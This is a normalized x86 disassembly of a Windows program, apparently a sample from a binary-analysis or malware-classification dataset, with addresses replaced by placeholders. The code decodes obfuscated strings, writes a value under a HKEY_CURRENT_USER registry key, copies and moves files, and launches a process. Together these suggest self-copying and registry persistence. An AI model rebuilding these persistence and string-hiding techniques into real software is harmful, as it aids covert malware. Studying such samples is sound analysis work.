sub_401000
sub esp 0x120
push ebx
push ebp
push esi
push edi
call sub_40167d
push 0x1
xor ebx ebx
test eax eax
pop esi
je r-xdata
call sub_40167d
test eax eax
je r-xdata
push esi
call _sleep
pop ecx
push ebx
push ebx
push ebx
call [ GetCurrentThreadId@IAT ]
push eax
call [ PostThreadMessageA@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] ebx
mov edi rw-data
push esi
push edi
call [ InitializeSecurityDescriptor@IAT ]
push ebx
push ebx
push esi
push edi
call [ SetSecurityDescriptorDacl@IAT ]
mov [ rw-data ] edi
jmp r-xdata
push ebx
push ebx
lea eax [ esp + 0x18 ]
push ebx
push eax
call [ GetMessageA@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
push 0x64
mov [ rw-data ] 0xc
mov [ rw-data ] esi
call _sleep
mov esi rw-data
push esi
call sub_401656
push esi
call strlen
push eax
mov ebx rw-data
push esi
push ebx
call strncpy
mov edi 0x104
push edi
push ebx
call sub_4016ab
mov esi rw-data
push esi
call sub_401656
push esi
call strlen
push eax
push esi
mov esi rw-data
push esi
call strncpy
push edi
push esi
call sub_4016ab
mov esi rw-data
push esi
call sub_401656
add esp 0x40
mov ebp rw-data
push esi
mov esi rw-data
push ebx
push esi
push ebp
call sprintf
push edi
push ebp
call sub_4016ab
mov ebp rw-data
push ebp
call sub_401656
push ebp
call strlen
push eax
push ebp
mov ebp rw-data
push ebp
call strncpy
push edi
push ebp
call sub_4016ab
push rw-data
push ebp
push esi
push rw-data
call sprintf
add esp 0x44
mov edi rw-data
push edi
call sub_401656
push edi
push ebx
lea eax [ esp + 0x38 ]
push esi
push eax
call sprintf
push rw-data
call sub_401656
push rw-data
call sub_401656
push rw-data
call sub_401656
push rw-data
call sub_401656
push rw-data
call sub_401656
push rw-data
call sub_401656
push rw-data
call sub_401656
push rw-data
call sub_401656
push rw-data
call sub_401656
call sub_4011e5
push edi
push rw-data
lea eax [ esp + 0x6c ]
push esi
push eax
call sprintf
add esp 0x48
lea eax [ esp + 0x2c ]
push eax
call sub_40147c
pop ecx
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x120
retn 0x10
sub_4011e5
push ebp
mov ebp esp
sub esp 0x724
mov ax [ rw-data ]
push ebx
push esi
mov esi rw-data
push edi
push esi
mov [ ebp - 0xa ] ax
call sub_401656
pop ecx
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x8 ]
xor edi edi
push eax
push edi
push 0xf003f
push edi
push edi
push edi
push esi
push 0x80000001
call [ RegCreateKeyExA@IAT ]
mov esi 0x104
mov ebx rw-data
push esi
push edi
push ebx
call memset
add esp 0xc
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] edi
push ebx
mov edi rw-data
push rw-data
push edi
call sprintf
push esi
push edi
call sub_4016ab
push rw-data
call sub_4015b5
push rw-data
mov esi rw-data
push rw-data
lea eax [ ebp - 0x220 ]
push esi
push eax
call sprintf
push rw-data
push rw-data
lea eax [ ebp - 0x324 ]
push esi
push eax
call sprintf
add esp 0x38
lea eax [ ebp - 0x324 ]
push 0x1
push eax
lea eax [ ebp - 0x220 ]
push eax
call [ MoveFileExA@IAT ]
test eax eax
je r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xa
jl r-xdata
push rw-data
push edi
lea eax [ ebp - 0x11c ]
push esi
push eax
call sprintf
add esp 0x10
jmp r-xdata
push ebx
push rw-data
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x18 ]
push ebx
push eax
push edi
push rw-data
push [ ebp - 0x8 ]
call [ RegQueryValueExA@IAT ]
cmp eax edi
je r-xdata
cmp eax edi
jne r-xdata
lea eax [ ebp - 0x11c ]
push 0x1
push eax
lea eax [ ebp - 0x220 ]
push eax
call [ MoveFileExA@IAT ]
lea eax [ ebp - 0xa ]
push eax
push rw-data
lea eax [ ebp - 0x724 ]
push esi
push eax
call sprintf
lea eax [ ebp - 0x724 ]
push rw-data
push eax
call fopen
add esp 0x18
test eax eax
je r-xdata
push rw-data
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
mov edi rw-data
push rw-data
push edi
call sprintf
push esi
push edi
call sub_4016ab
push rw-data
push edi
lea eax [ ebp - 0x11c ]
push rw-data
push eax
call sprintf
add esp 0x20
xor eax eax
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push eax
call fclose
pop ecx
jmp r-xdata
push rw-data
call [ PathFileExistsA@IAT ]
test eax eax
jne r-xdata
push 0x0
push rw-data
push rw-data
call [ CopyFileA@IAT ]
mov ebx rw-data
push ebx
call strlen
pop ecx
push eax
push ebx
push 0x2
push 0x0
push rw-data
push [ ebp - 0x8 ]
call [ RegSetValueExA@IAT ]
test eax eax
jne r-xdata
push rw-data
push rw-data
call fopen
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
je r-xdata
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0xa ]
push eax
push rw-data
lea eax [ ebp - 0x724 ]
push esi
push eax
call sprintf
lea eax [ ebp - 0x724 ]
push rw-data
push eax
call fopen
add esp 0x18
test eax eax
je r-xdata
push ebx
call sub_4014c7
pop ecx
push [ ebp - 0x4 ]
push ebx
call strlen
pop ecx
push eax
push 0x1
push ebx
call fwrite
push [ ebp - 0x4 ]
call fclose
add esp 0x14
push 0x1
pop eax
jmp r-xdata
push eax
call fclose
pop ecx
pop edi
pop esi
pop ebx
leave
retn
sub_40147c
push ebp
mov ebp esp
sub esp 0x54
push esi
push 0x44
pop eax
xor esi esi
mov [ ebp - 0x54 ] eax
push eax
lea eax [ ebp - 0x54 ]
push esi
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x81
mov [ ebp - 0x24 ] 0x5
push eax
lea eax [ ebp - 0x54 ]
push eax
push esi
push esi
push 0x20
push esi
push esi
push esi
push [ ebp + 0x8 ]
push esi
call [ CreateProcessA@IAT ]
neg eax
sbb eax eax
pop esi
inc eax
leave
retn
sub_4014c7
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call strlen
pop ecx
mov edi eax
xor ecx ecx
test edi edi
jle r-xdata
pop edi
xor eax eax
pop esi
retn
push ebx
mov edx eax
sub edx 0x20
je r-xdata
je r-xdata
test [ ecx + esi ] 0x20
je r-xdata
sub edx 0x20
je r-xdata
test [ ecx + esi ] 0x10
je r-xdata
mov edx eax
dec edx
je r-xdata
and bl 0xbf
or bl 0x40
jmp r-xdata
test [ ecx + esi ] 0x40
je r-xdata
sub edx 0x40
jne r-xdata
and bl 0xfd
jmp r-xdata
or bl 0x2
jmp r-xdata
test [ ecx + esi ] 0x1
je r-xdata
dec edx
je r-xdata
cmp eax 0x10
jg r-xdata
mov [ ecx + esi ] bl
inc ecx
cmp ecx edi
jl r-xdata
cdq
sub eax edx
sar eax 0x1
test eax eax
jg r-xdata
and bl 0xdf
jmp r-xdata
or bl 0x20
jmp r-xdata
test [ ecx + esi ] 0x80
je r-xdata
and bl 0xfe
jmp r-xdata
or bl 0x1
jmp r-xdata
test [ ecx + esi ] 0x2
je r-xdata
dec edx
dec edx
je r-xdata
xor bl bl
mov eax 0x80
pop ebx
and bl 0x7f
jmp r-xdata
or bl 0x80
jmp r-xdata
and bl 0xef
jmp r-xdata
or bl 0x10
jmp r-xdata
test [ ecx + esi ] 0x4
je r-xdata
sub edx 0x4
jne r-xdata
and bl 0xfb
jmp r-xdata
or bl 0x4
jmp r-xdata
test [ ecx + esi ] 0x8
je r-xdata
and bl 0xf7
jmp r-xdata
or bl 0x8
jmp r-xdata
sub_4015b5
push ebp
mov ebp esp
sub esp 0x108
mov eax [ ebp + 0x8 ]
push ebx
lea ecx [ ebp - 0x108 ]
xor ebx ebx
push esi
sub eax ecx
push edi
mov edi [ PathFileExistsA@IAT ]
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
lea esi [ ebp + ebx - 0x108 ]
cmp [ eax + esi ] 0x5c
jne r-xdata
push [ ebp + 0x8 ]
call edi
neg eax
sbb eax eax
pop edi
pop esi
pop ebx
neg eax
leave
retn
push eax
push [ ebp + 0x8 ]
call [ CreateDirectoryA@IAT ]
inc ebx
cmp ebx 0x104
jl r-xdata
cmp ebx 0x2
je r-xdata
push [ ebp + 0x8 ]
call strlen
cmp ebx eax
pop ecx
jae r-xdata
push ebx
lea eax [ ebp - 0x108 ]
push [ ebp + 0x8 ]
push eax
call strncpy
and [ esi ] 0x0
add esp 0xc
lea eax [ ebp - 0x108 ]
push eax
call edi
test eax eax
jne r-xdata
push eax
lea eax [ ebp - 0x108 ]
push eax
call [ CreateDirectoryA@IAT ]
sub_401656
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_4014c7
push esi
call strlen
pop ecx
pop ecx
and [ eax + esi + 0x1 ] 0x0
xor eax eax
pop esi
retn
test eax eax
jg r-xdata
dec eax
cmp [ eax + esi ] 0x20
jne r-xdata
sub_4016ab
push ebp
mov ebp esp
sub esp 0x3c0
push ebx
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x2bc ]
push 0x8
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop edx
xor eax eax
mov ecx edx
lea edi [ ebp - 0x2ad ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov esi rw-data
lea edi [ ebp - 0x28a ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ecx edx
xor eax eax
lea edi [ ebp - 0x279 ]
mov esi rw-data
[ edi ]
stosb [ edi ]
lea edi [ ebp - 0x258 ]
push 0x9
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x24a ]
mov esi rw-data
[ edi ]
lea edi [ ebp - 0x226 ]
push 0xb
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop ecx
lea edi [ ebp - 0x223 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov esi rw-data
lea edi [ ebp - 0x1f4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0x9
xor eax eax
pop ecx
lea edi [ ebp - 0x1e7 ]
[ edi ]
stosb [ edi ]
mov ebx rw-data
lea edi [ ebp - 0x1c2 ]
mov esi ebx
push 0x9
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x1b7 ]
mov esi rw-data
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea edi [ ebp - 0x190 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
push 0x9
xor eax eax
pop ecx
lea edi [ ebp - 0x182 ]
[ edi ]
mov esi rw-data
lea edi [ ebp - 0x15e ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx edx
lea edi [ ebp - 0x14c ]
[ edi ]
mov esi rw-data
lea edi [ ebp - 0x12c ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0xa
lea edi [ ebp - 0x125 ]
pop ecx
[ edi ]
stosw [ edi ]
mov ecx edx
mov edx rw-data
stosb [ edi ]
mov esi edx
lea edi [ ebp - 0xfa ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
xor eax eax
lea edi [ ebp - 0xd7 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
mov esi rw-data
lea edi [ ebp - 0xc8 ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
push 0xb
xor eax eax
pop ecx
lea edi [ ebp - 0xc2 ]
[ edi ]
push 0x8
mov esi edx
pop ecx
lea edi [ ebp - 0x96 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
lea edi [ ebp - 0x73 ]
mov esi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
lea edi [ ebp - 0x64 ]
push 0xa
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x5b ]
mov esi ebx
[ edi ]
stosb [ edi ]
lea edi [ ebp - 0x32 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0x9
xor eax eax
pop ecx
lea edi [ ebp - 0x27 ]
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
[ edi ]
stosw [ edi ]
push esi
stosb [ edi ]
call [ DoEnvironmentSubstA@IAT ]
cmp [ esi ] 0x25
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
xor ebx ebx
lea edi [ ebp - 0x2bc ]
mov eax ebx
imul eax eax 0x64
lea eax [ ebp + eax - 0x28a ]
push eax
lea eax [ ebp - 0x3c0 ]
push rw-data
push eax
call sprintf
push 0x25
push esi
call strrchr
inc eax
push eax
lea eax [ ebp - 0x3c0 ]
push eax
call strcat
add esp 0x1c
inc ebx
add edi 0x64
cmp ebx 0x7
jl r-xdata
lea eax [ ebp - 0x3c0 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x3c0 ]
push eax
push esi
call strncpy
lea eax [ ebp - 0x3c0 ]
push eax
call strlen
add esp 0x14
and [ eax + esi ] 0x0
lea eax [ ebp - 0x3c0 ]
push rw-data
push eax
call sprintf
push 0x25
push esi
call strrchr
inc eax
push eax
lea eax [ ebp - 0x3c0 ]
push eax
call strcat
add esp 0x18
push edi
call strlen
push eax
push edi
push esi
call strncmp
add esp 0x10
test eax eax
je r-xdata
jmp r-xdata
cmp ebx 0x7
jl r-xdata
sub_401970
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401b1f
cmp [ rw-data ] ebx
jne r-xdata
call sub_401b0a
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_401b1c
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_40167d
push ebp
mov ebp esp
sub esp 0x94
lea eax [ ebp - 0x94 ]
mov [ ebp - 0x94 ] 0x94
push eax
call [ GetVersionExA@IAT ]
xor eax eax
cmp [ ebp - 0x84 ] 0x2
sete al
leave
retn
sprintf
jmp [ sprintf@IAT ]
strncpy
jmp [ strncpy@IAT ]
strlen
jmp [ strlen@IAT ]
_sleep
jmp [ _sleep@IAT ]
fclose
jmp [ fclose@IAT ]
fwrite
jmp [ fwrite@IAT ]
fopen
jmp [ fopen@IAT ]
strcmp
jmp [ strcmp@IAT ]
memset
jmp [ memset@IAT ]
strcat
jmp [ strcat@IAT ]
strrchr
jmp [ strrchr@IAT ]
strncmp
jmp [ strncmp@IAT ]
sub_401af1
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401b0a
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_401b1c
xor eax eax
retn
sub_401b1f
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
